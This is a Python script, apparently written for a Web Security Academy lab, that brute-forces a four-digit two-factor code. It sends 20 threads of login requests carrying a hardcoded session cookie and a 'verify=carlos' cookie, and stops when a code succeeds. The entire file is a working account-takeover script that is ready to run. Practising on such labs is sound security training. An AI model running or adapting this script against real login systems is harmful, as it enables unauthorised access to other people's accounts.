
#Author: MeowHecker 侯智晟
#purpose: Testing websit security 
import requests
import threading
import sys 

url = "https://0abb00900473ee8581fda7b000210004.web-security-academy.net/login2"

headersInfo = {
    "Host": "0abb00900473ee8581fda7b000210004.web-security-academy.net",
    "Cookie": "session=ZMa2DO1IVwmxTXziQudZArIN2hOTK96N; verify=carlos",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "13",
    "Origin": "https://0a9a007003b6a113810d20ef00100039.web-security-academy.net",
    "Referer": "https://0a9a007003b6a113810d20ef00100039.web-security-academy.net/login2",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Te": "trailers"
}

requestNum = 0

def sendRequest(maf_code,sem): # 這里參數可以改成要調整得值
    
    global requestNum 
    payloads = {
        "mfa-code": maf_code
    }
    response = requests.post(url,headers = headersInfo,data=payloads)
    
    print(f'requestNum{requestNum}:stauts code:{response.status_code} payloads: {maf_code}')

    requestNum = requestNum + 1

     # 透過staut code 來判斷是否登入
    if(response.status_code != 200):
        print(f"mfa-code: {maf_code}, Response: {response.text}")
        sys.exit()  # 在找到目標後終止程式
   
    
    sem.release()  # 釋放信號 
    sys.exit() # Termerate a sub threading process 


def threadingF():

    maxThreading = 20
    sem = threading.BoundedSemaphore(maxThreading)


    # str(i).zfill(4) 將每個數字轉換為 4 位數的字串
    for i in range(10000):
        maf_code = str(i).zfill(4) # Pad a numeric string with zeros on the left, to fill 0000 0001
        sem.acquire() # 獲得信號
        sendRequestHandler = threading.Thread(target=sendRequest, args=(maf_code,sem))
        sendRequestHandler.start()
        print("Number of active threads:", threading.active_count())

    sys.exit()
  
    
threadingF()

sys.exit()